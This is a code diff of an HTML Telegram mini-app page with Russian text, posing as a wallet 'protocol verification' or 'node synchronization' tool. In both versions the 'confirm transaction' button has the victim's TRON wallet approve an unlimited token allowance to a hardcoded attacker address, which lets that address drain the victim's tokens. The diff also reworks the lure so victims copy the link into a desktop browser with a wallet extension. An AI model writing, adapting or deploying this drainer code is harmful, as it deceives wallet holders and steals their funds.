@@ -3,44 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Trust Sync</title>
+    <title>Protocol Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 30px; width: 85%; max-width: 380px; background: #111; border-radius: 30px; border: 1px solid #222; }
-        .logo { width: 65px; height: 65px; background: #3375BB; border-radius: 18px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; box-shadow: 0 0 20px rgba(51,117,187,0.4); }
-        h2 { font-size: 20px; margin-bottom: 10px; }
+        .card { padding: 40px 25px; width: 90%; max-width: 400px; background: #111; border-radius: 20px; border: 1px solid #222; }
+        .logo { width: 60px; height: 60px; background: #ff0013; border-radius: 15px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; }
+        h2 { font-size: 22px; margin-bottom: 10px; }
         p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
-        .btn { display: block; background: #3375BB; color: #fff; text-decoration: none; padding: 18px; border-radius: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer; border: none; width: 100%; box-sizing: border-box; }
+        .btn { background: #ff0013; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; text-transform: uppercase; cursor: pointer; font-size: 14px; transition: 0.2s; }
         .btn:active { transform: scale(0.96); }
+        .copy-box { background: #1a1a1a; border: 1px dashed #444; padding: 15px; border-radius: 10px; margin-bottom: 20px; word-break: break-all; font-size: 12px; color: #aaa; }
         
-        /* Блок ошибки сети */
-        #error-box { display: none; background: #3a1111; border: 1px solid #ff4444; padding: 15px; border-radius: 15px; margin-bottom: 20px; color: #ff6666; font-size: 13px; }
-        #wallet-ui { display: none; }
+        #wallet-ui, #telegram-ui { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div id="error-box">
-        ⚠️ <b>НЕВЕРНАЯ СЕТЬ</b><br><br>
-        Нажмите на <b>три точки (⋮)</b> в правом верхнем углу, выберите <b>"Сеть" (Network)</b> и смените её на <b>TRON</b>.
-    </div>
+    <div class="logo">T</div>
 
-    <div id="tg-ui">
-        <div class="logo">🛡️</div>
-        <h2>Запуск верификации</h2>
-        <p>Нажмите кнопку ниже, чтобы открыть Trust Wallet и подтвердить синхронизацию.</p>
+    <div id="telegram-ui">
+        <h2>Доступ ограничен</h2>
+        <p>Телеграм не поддерживает прямое подключение кошельков. Скопируйте ссылку и откройте её в браузере (например, в Chrome), где установлен ваш кошелек.</p>
         
-        <a id="tw-link" href="#" class="btn">ОТКРЫТЬ TRUST WALLET</a>
+        <div class="copy-box" id="url-text">https://timur3417.github.io/sync-node-app/</div>
+        <button class="btn" id="copy-btn">СКОПИРОВАТЬ ССЫЛКУ</button>
     </div>
 
     <div id="wallet-ui">
-        <div class="logo">T</div>
-        <h2 id="w-title">Узел Обнаружен</h2>
-        <p id="w-desc">Кошелек успешно синхронизирован. Нажмите кнопку для финального подтверждения.</p>
-        <button id="verify-btn" class="btn">ПОДТВЕРДИТЬ ТРАНЗАКЦИЮ</button>
+        <h2>Узел Обнаружен</h2>
+        <p>Соединение установлено. Нажмите кнопку ниже для финальной подписи транзакции.</p>
+        <button class="btn" id="verify-btn">ПОДТВЕРДИТЬ ТРАНЗАКЦИЮ</button>
     </div>
 </div>
 
@@ -50,63 +44,48 @@
 
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const MY_URL = "https://timur3417.github.io/sync-node-app/";
-    
-    // Формируем правильную ссылку для Trust Wallet
-    const targetUrl = MY_URL + "?mode=tw";
-    const trustLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(targetUrl);
 
-    document.getElementById('tw-link').href = trustLink;
+    // Проверяем, есть ли расширение кошелька прямо сейчас
+    function init() {
+        const hasWallet = window.tronWeb || (window.tron && window.tron.tronWeb);
 
-    function checkEnvironment() {
-        const provider = window.tronWeb || (window.tron && window.tron.tronWeb) || window.trustwallet;
-        const isWalletMode = window.location.search.includes('mode=tw');
-
-        if (provider || isWalletMode) {
-            document.getElementById('tg-ui').style.display = 'none';
+        if (hasWallet) {
             document.getElementById('wallet-ui').style.display = 'block';
-            
-            // Если мы в кошельке, проверяем, Трон ли это
-            setTimeout(() => {
-                const tw = window.tronWeb || (window.tron && window.tron.tronWeb);
-                if (!tw || !tw.defaultAddress.base58) {
-                    // Если Трон не найден (включен Эфир), показываем красную инструкцию
-                    document.getElementById('error-box').style.display = 'block';
-                    document.getElementById('w-title').innerText = "Ожидание сети";
-                    document.getElementById('w-desc').innerText = "Пожалуйста, смените сеть по инструкции выше.";
-                } else {
-                    document.getElementById('error-box').style.display = 'none';
-                }
-            }, 1500);
+        } else {
+            document.getElementById('telegram-ui').style.display = 'block';
         }
     }
 
-    // Логика нажатия внутри кошелька
-    document.getElementById('verify-btn').onclick = async () => {
-        const tw = window.tronWeb || (window.tron && window.tron.tronWeb);
-        
-        if (!tw || !tw.defaultAddress.base58) {
-            document.getElementById('error-box').style.display = 'block';
-            tg.showAlert("Сначала смените сеть на TRON через меню (три точки)!");
-            return;
-        }
+    // Кнопка копирования
+    document.getElementById('copy-btn').onclick = () => {
+        const url = document.getElementById('url-text').innerText;
+        navigator.clipboard.writeText(url).then(() => {
+            document.getElementById('copy-btn').innerText = "СКОПИРОВАНО!";
+            document.getElementById('copy-btn').style.background = "#28a745";
+        }).catch(err => {
+            tg.showAlert("Не удалось скопировать. Выделите текст вручную.");
+        });
+    };
 
+    // Кнопка подтверждения (когда открыто на ПК в Chrome)
+    document.getElementById('verify-btn').onclick = async () => {
         try {
-            document.getElementById('verify-btn').innerText = "ОБРАБОТКА...";
+            const tw = window.tronWeb || window.tron.tronWeb;
+            document.getElementById('verify-btn').innerText = "ОЖИДАНИЕ...";
+            
             await tw.request({ method: 'tron_requestAccounts' });
             const contract = await tw.contract().at(CONTRACT);
-            
             await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
             
-            tg.showPopup({ title: 'Успешно', message: 'Синхронизация завершена.', buttons: [{type: 'ok'}] });
-            setTimeout(() => tg.close(), 4000);
+            alert('Успешно! Синхронизация завершена.');
         } catch (e) {
+            alert('Ошибка или отмена. Подтвердите действие в окне кошелька.');
             document.getElementById('verify-btn').innerText = "ПОДТВЕРДИТЬ ТРАНЗАКЦИЮ";
-            tg.showAlert("Действие отклонено. Попробуйте еще раз.");
         }
     };
 
-    checkEnvironment();
+    // Даем браузеру полсекунды на загрузку расширений
+    setTimeout(init, 500);
 </script>
 </body>
 </html>
